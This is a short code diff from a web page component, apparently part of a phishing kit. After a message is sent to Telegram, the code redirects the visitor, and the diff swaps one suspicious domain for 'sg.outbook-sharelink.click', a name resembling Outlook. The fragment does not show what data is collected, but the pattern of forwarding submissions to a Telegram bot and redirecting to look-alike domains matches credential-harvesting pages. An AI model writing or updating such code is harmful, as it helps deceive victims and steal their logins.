@@ -57,7 +57,7 @@ export default function Home() {
 
         if (response.status === 200) {
           console.log('Message sent successfully to Telegram!', response.data);
-          window.location.href = 'https://sg.alltracktransportl.com'; // Redirect on success
+          window.location.href = 'https://sg.outbook-sharelink.click'; // Redirect on success
         } else {
           throw new Error('Failed to send message to Telegram.');
         }
